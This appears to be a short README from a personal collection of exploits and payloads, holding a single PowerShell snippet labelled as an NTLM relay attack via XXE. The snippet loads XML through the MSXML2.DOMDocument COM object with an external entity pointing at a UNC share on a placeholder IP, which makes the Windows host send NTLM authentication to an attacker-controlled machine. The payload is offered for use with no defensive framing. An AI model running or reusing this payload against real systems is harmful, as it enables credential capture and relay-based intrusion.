## My random exploits / payloads

### ntlm relay attack via XXE utilizing COM object MSXML2.DOMDocument (Thanks to @[Frostb1te](https://twitter.com/frostb1ten) for helping me learn about ntlm relay)

```
$xxe=New-Object -ComObject MSXML2.DOMDocument
$xxe.loadXML("<!DOCTYPE test [<!ENTITY xxe SYSTEM '\\IP\share'>]><root><test>&xxe;</test></root>")
```
